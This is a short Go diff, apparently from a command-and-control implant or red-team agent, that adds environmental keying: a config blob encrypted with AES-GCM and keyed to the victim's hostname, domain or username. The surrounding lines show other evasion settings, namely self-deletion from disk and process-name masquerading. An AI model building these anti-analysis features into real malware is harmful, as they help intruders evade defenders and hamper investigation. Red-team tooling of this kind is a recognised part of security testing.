@@ -40,6 +40,8 @@ var (
 	envKeyDomain           string = "" // Environment key: domain must match this regex
 	envKeyUsername         string = "" // Environment key: username must match this regex
 	envKeyProcess          string = "" // Environment key: this process must be running
+	envKeyDerive           string = "" // Environmental keying method: hostname, domain, username, hostname+domain, hostname+domain+username
+	envDerivedBlob         string = "" // Base64 AES-GCM encrypted config blob (keyed to host environment)
 	selfDelete             string = "" // Self-delete binary from disk after execution starts
 	masqueradeName         string = "" // Process name masquerade (Linux: prctl PR_SET_NAME)
 	customHeaders          string = "" // Base64-encoded JSON of additional HTTP headers
@@ -126,6 +128,8 @@ func clearGlobals() {
 	envKeyDomain = ""
 	envKeyUsername = ""
 	envKeyProcess = ""
+	envKeyDerive = ""
+	envDerivedBlob = ""
 
 	// mTLS client certificates (reveal identity)
 	mtlsCertPEM = ""
